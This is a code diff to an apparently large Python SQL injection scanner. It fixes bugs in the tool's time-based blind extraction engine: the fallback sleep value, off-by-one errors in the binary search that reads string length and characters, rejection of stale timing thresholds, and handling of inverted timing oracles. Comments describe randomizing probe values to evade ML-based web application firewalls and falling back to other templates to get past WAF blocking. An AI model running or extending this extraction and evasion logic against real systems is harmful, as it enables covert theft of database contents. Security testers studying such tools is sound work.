@@ -56741,8 +56741,14 @@ class Scanner:
                   f" (jitter_floor={_jitter_floor_inf:.3f}s, effective={_delay:.3f}s)"
                   " for extraction (may floor to 0.3s if margin insufficient)", flush=True)
         else:
-            _delay = max(getattr(enum.config, "delay", 0) or 0, 0.5)
-            print(f"[+] [Inference] No sleep value in detection payload — falling back to {_delay:.1f}s", flush=True)
+            # BUG-INFERENCE-SLEEP-FALLBACK FIX: config.delay is HTTP inter-request
+            # pacing (e.g. 0.1s), NOT the SQL sleep duration.  Using it as the timing
+            # oracle sleep caused near-zero delays → oracle non-functional.  Use
+            # config.time_sec (the user-specified SQL sleep) with a 5.0s default.
+            _delay = float(getattr(enum.config, "time_sec", 0) or 0)
+            if _delay <= 0:
+                _delay = 5.0
+            print(f"[+] [Inference] No sleep value in detection payload — falling back to {_delay:.1f}s (from config.time_sec)", flush=True)
         # Initialize oracle variables (used by _eval before calibration sets them)
         _body_hash_true = None
         _body_hash_false = None
@@ -100670,10 +100676,14 @@ class ScannerV11(ScannerV10):
                                 # all surfaces): Fixed pivot detectable by ML WAFs.
                                 # Fix: use _randomized_mid(lo11, hi11) (TECHNIQUE-3).
                                 mid11 = _randomized_mid(lo11, hi11)
-                                ms11 = await _probe11(_ltpl11.format(q=sql, m=mid11))
+                                # BUG-V11ENUM-OFFBY1-LEN FIX (HIGH): template is ">={m}";
+                                # must pass m=mid+1 so ">={mid+1}" is semantically ">{mid}",
+                                # matching the lo=mid+1-on-True update rule.  Without +1,
+                                # the binary search terminates at length+1 (off by one high).
+                                ms11 = await _probe11(_ltpl11.format(q=sql, m=mid11 + 1))
                                 if ms11 < 30:   # dead probe — skip, don't treat as False
                                     await asyncio.sleep(_delay11)
-                                    ms11 = await _probe11(_ltpl11.format(q=sql, m=mid11))
+                                    ms11 = await _probe11(_ltpl11.format(q=sql, m=mid11 + 1))
                                 if ms11 < 30:
                                     break       # oracle dead — stop
                                 if ms11 >= _thresh11: lo11 = mid11 + 1
@@ -100713,10 +100723,13 @@ class ScannerV11(ScannerV10):
                                     # Fixed pivot detectable by ML WAFs after 3-5 chars.
                                     # Fix: use _randomized_mid(lo_c11, hi_c11) (TECHNIQUE-3).
                                     mid_c11 = _randomized_mid(lo_c11, hi_c11)
-                                    ms11 = await _probe11(_ctpl11.format(q=sql, p=pos11, m=mid_c11))
+                                    # BUG-V11ENUM-OFFBY1-CHAR FIX (HIGH): same as length fix above —
+                                    # template is ">={m}", so pass m=mid_c+1 to keep semantics ">{mid_c}".
+                                    # Without +1, chr(result) is one codepoint too high for every char.
+                                    ms11 = await _probe11(_ctpl11.format(q=sql, p=pos11, m=mid_c11 + 1))
                                     if ms11 < 30:   # dead probe — retry once
                                         await asyncio.sleep(_delay11)
-                                        ms11 = await _probe11(_ctpl11.format(q=sql, p=pos11, m=mid_c11))
+                                        ms11 = await _probe11(_ctpl11.format(q=sql, p=pos11, m=mid_c11 + 1))
                                     if ms11 < 30:
                                         break       # oracle dead — stop this char
                                     if ms11 >= _thresh11: lo_c11 = mid_c11 + 1
@@ -145081,10 +145094,25 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # 5730 < 100+2000*3.0=6100).  Reduce to 1.5 so 5730 > 100+2000*1.5=3100
         # correctly invalidates the stale entry and forces fresh calibration.
         _max_reasonable = _base_time + t * 1000 * 1.5
+        _min_reasonable = max(_base_time * 1.2 + 100, _base_time + t * 1000 * 0.4) * 0.70
         if _cached_thresh > _max_reasonable:
             print(f"[!] [TBExtract] Cached thresh={_cached_thresh:.0f}ms is unreachable "
                   f"with current baseline={_base_time:.0f}ms sleep={t}s "
                   f"(max_reasonable={_max_reasonable:.0f}ms)  "
+                  "invalidating stale calibration cache.", flush=True)
+            del _TB_CALIBRATION_CACHE[_cal_key]
+        elif _cached_thresh < _min_reasonable:
+            # BUG-CALCACHE-LOWERBOUND FIX (CRITICAL): the old min()-based _cal_hit()
+            # produced noise-level thresholds (e.g. 318ms for base=200ms, sleep=2s)
+            # that pass the upper-bound check (318 < 200+2000*1.5=3200) but fire on
+            # every jitter spike → all extraction bits read True → garbage output
+            # (root cause of 24-hour extraction timeout).  Require the cached threshold
+            # to be at least 70% of the _cal_hit() floor:
+            #   max(base*1.2+100, base+sleep_ms*0.4) * 0.70
+            # so only entries reflecting a genuine sleep contribution are reused.
+            print(f"[!] [TBExtract] Cached thresh={_cached_thresh:.0f}ms is too low "
+                  f"(min_reasonable={_min_reasonable:.0f}ms, "
+                  f"baseline={_base_time:.0f}ms sleep={t}s)  "
                   "invalidating stale calibration cache.", flush=True)
             del _TB_CALIBRATION_CACHE[_cal_key]
         else:
@@ -151065,32 +151093,57 @@ class ExtractionOrchestrator:
             # max_len and every character to chr(126)='~'.
             # Correct check: require _best_margin >= 80 (positive AND large enough).
             if _best_margin < 80:
-                LOG.warning("[DetTemplate] Calibration margin %.0fms < 80ms  "
-                            "timing oracle unreliable, aborting", _cal_margin)
-                return ""
-            # BUG-DETTEMPLATE-THRESH-CDN-FIX (CRITICAL): The old threshold was the
-            # simple midpoint (_best_ms_t + _best_ms_f) / 2.  For CDN-backed targets
-            # with ~150ms per-probe jitter, a false probe at _best_ms_f + 150ms
-            # can exceed the midpoint threshold → oracle evaluates True for a False
-            # DBMS condition → length binary-search converges to max_len=256 → every
-            # character extracted as max-codepoint → garbage Unicode output.
-            # Same root cause as BUG-STRAT-MARGIN-CDN-FIX (TBExtract) fixed earlier.
-            # Fix: use max(midpoint, false_floor + 150ms, 300ms) as threshold, identical
-            # to TBExtract's formula.  The +150ms floor ensures that a false probe with
-            # worst-case CDN jitter (+150ms above baseline) remains BELOW the threshold,
-            # so false conditions never flip to True in the extraction oracle.
-            # Numeric safety: threshold is compared against elapsed time in milliseconds;
-            # no SQL comparison operands, string delimiters, or literal values are affected.
-            self._dt_thresh = max((_best_ms_t + _best_ms_f) / 2,
-                                  _best_ms_f + 150,
-                                  300.0)
-            self._dt_margin = _cal_margin
-            # BUG-DETTEMPLATE-CAL-MSFF FIX: store false baseline so _eval can compute a
-            # DBMS-adaptive dead-probe floor (instead of the fixed 30ms cutoff which
-            # incorrectly treats legitimate fast false responses as dead probes).
-            self._dt_false_ms = _best_ms_f
-            LOG.info("[DetTemplate] Calibrated: thresh=%.0fms margin=%.0fms false_floor=%.0fms",
-                     self._dt_thresh, _cal_margin, _best_ms_f)
+                if -_best_margin >= 80:
+                    # BUG-DETTEMPLATE-INVERTED-ORACLE FIX: inverted timing oracle —
+                    # TRUE conditions return fast, FALSE conditions return slow (e.g.
+                    # MSSQL/Sybase cross-join delay fires on the FALSE branch).
+                    # _best_margin = ms_t - ms_f < 0, so abs = -_best_margin >= 80ms
+                    # is a valid discriminating signal; we only need to flip the _eval
+                    # comparison from (ms >= _thresh) to (ms < _thresh) so that the
+                    # slow FALSE probes evaluate to False and fast TRUE probes to True.
+                    # Threshold is set between the two baselines with enough buffer for
+                    # typical ±20ms jitter.
+                    self._dt_thresh   = max(
+                        (_best_ms_t + _best_ms_f) / 2,
+                        _best_ms_t + 30,
+                        100.0,
+                    )
+                    self._dt_inverted = True
+                    self._dt_margin   = -_best_margin
+                    self._dt_false_ms = _best_ms_t  # fast/baseline for dead-probe floor
+                    LOG.info(
+                        "[DetTemplate] Inverted oracle: TRUE=%.0fms FALSE=%.0fms "
+                        "margin=%.0fms thresh=%.0fms",
+                        _best_ms_t, _best_ms_f, -_best_margin, self._dt_thresh,
+                    )
+                else:
+                    LOG.warning("[DetTemplate] Calibration margin %.0fms < 80ms  "
+                                "timing oracle unreliable, aborting", _cal_margin)
+                    return ""
+            else:
+                # BUG-DETTEMPLATE-THRESH-CDN-FIX (CRITICAL): The old threshold was the
+                # simple midpoint (_best_ms_t + _best_ms_f) / 2.  For CDN-backed targets
+                # with ~150ms per-probe jitter, a false probe at _best_ms_f + 150ms
+                # can exceed the midpoint threshold → oracle evaluates True for a False
+                # DBMS condition → length binary-search converges to max_len=256 → every
+                # character extracted as max-codepoint → garbage Unicode output.
+                # Same root cause as BUG-STRAT-MARGIN-CDN-FIX (TBExtract) fixed earlier.
+                # Fix: use max(midpoint, false_floor + 150ms, 300ms) as threshold, identical
+                # to TBExtract's formula.  The +150ms floor ensures that a false probe with
+                # worst-case CDN jitter (+150ms above baseline) remains BELOW the threshold,
+                # so false conditions never flip to True in the extraction oracle.
+                # Numeric safety: threshold is compared against elapsed time in milliseconds;
+                # no SQL comparison operands, string delimiters, or literal values are affected.
+                self._dt_thresh = max((_best_ms_t + _best_ms_f) / 2,
+                                      _best_ms_f + 150,
+                                      300.0)
+                self._dt_margin = _cal_margin
+                # BUG-DETTEMPLATE-CAL-MSFF FIX: store false baseline so _eval can compute a
+                # DBMS-adaptive dead-probe floor (instead of the fixed 30ms cutoff which
+                # incorrectly treats legitimate fast false responses as dead probes).
+                self._dt_false_ms = _best_ms_f
+                LOG.info("[DetTemplate] Calibrated: thresh=%.0fms margin=%.0fms false_floor=%.0fms",
+                         self._dt_thresh, _cal_margin, _best_ms_f)
 
         _thresh = self._dt_thresh
         # BUG-DETTEMPLATE-CAL-MSFF FIX: _eval dead-probe floor must account for
@@ -151135,7 +151188,9 @@ class ExtractionOrchestrator:
                         "all in %.1f..%.1fms (±%.1fms) — WAF challenge page; aborting",
                         _UNIFORM_WINDOW, _win_min, _win_max, _win_max - _win_min)
                     return None
-            return ms >= _thresh
+            # BUG-DETTEMPLATE-INVERTED-ORACLE FIX: flip comparison for inverted oracles
+            # (TRUE=fast, FALSE=slow) so slow FALSE probes correctly evaluate to False.
+            return (ms < _thresh) if getattr(self, '_dt_inverted', False) else (ms >= _thresh)
 
         # ── Alternative length templates (WAF bypass fallback) ───────────────
         # BUG-DEADPROBE-LTPL-FIX: WAF may block the primary length function
